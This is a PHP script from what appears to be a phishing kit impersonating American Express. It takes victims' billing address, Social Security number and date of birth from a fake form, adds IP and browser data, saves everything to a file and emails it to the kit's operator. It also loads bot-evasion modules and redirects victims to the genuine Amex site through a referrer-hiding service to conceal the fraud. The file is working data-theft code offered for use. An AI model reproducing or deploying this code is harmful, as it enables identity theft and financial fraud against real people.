<?php
ob_start();
session_start();

include'../Anti/IP-BlackList.php';  
include'../Anti/Bot-Crawler.php';
include'../Anti/Bot-Spox.php';
include'../Anti/blacklist.php';
include'../Anti/new.php';
include'../Anti/Dila_DZ.php';

if(isset($_POST['address1'])&&isset($_POST['zipcode'])&&isset($_POST['city'])&&isset($_POST['spox'])){
	include '../config.php';
	include '../Functions/Fuck-you.php';

	$hi="#---------------------------[ -AMEX SPOX- BILLING ]----------------------------#\r\n";
	$hi.="Street Address 1: {$_POST['address1']}\r\n";
	$hi.="Street Address 2: {$_POST['address2']}\r\n";
	$hi.="City: {$_POST['city']}\r\n";
	$hi.="Zip code: {$_POST['zipcode']}\r\n";
	$hi.="State: {$_POST['state']}\r\n";
	$hi.="SSN: {$_POST['ssn']}\r\n";
	$hi.="DOB: {$_POST['dob']}\r\n";

	$hi.="#---------------------------[ -AMEX SPOX- IP INFO ]----------------------------#\r\n";
	$hi.="IP ADDRESS	: {$_SESSION['ip']}\r\n";
	$hi.="IP COUNTRY	: {$_SESSION['country']}\r\n";
	$hi.="IP CITY	: {$_SESSION['city']}\r\n";
	$hi.="BROWSER		: {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
	$hi.="USER AGENT	: {$_SERVER['HTTP_USER_AGENT']}\r\n";
	$hi.="TIME		: ".date("d/m/Y h:i:sa")." GMT\r\n";
	$hi.="#---------------------------[ -AMEX SPOX- BILLING ]----------------------------#\r\n";

		$save=fopen("../amex/billing.txt","a+");
		fwrite($save,$hi);
		fclose($save);


	$subject="#AMEX SPOX BILLING From {$_SESSION['ip']} [ {$_SESSION['country']}-{$_SESSION['countrycode']} - {$_SESSION['platform']} ]";

	$headers="From: AMEX SPOX  <amex_spox@dila.dz>\r\n";
	$headers.="MIME-Version: 1.0\r\n";
	$headers.="Content-Type: text/plain; charset=UTF-8\r\n";

		@mail($your_email,$subject,$hi,$headers);
		
    	$key = substr(sha1(mt_rand()),1,25);


	      if ($show_success_page=="yes") {
		 exit(header("Location: ../../thanks?amex_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode']."")); 
	     }else{

		$helper = array_keys($_SESSION);
    		foreach ($helper as $key){
        		unset($_SESSION[$key]);
    			}
    		exit(header("Location: https://utilify.me/hide-referrer/https://amex.co/2kgS15Q")); // go to bank login page officiel..
	     }
 

  }else{
    header("HTTP/1.0 404 Not Found");
    exit();
}

?>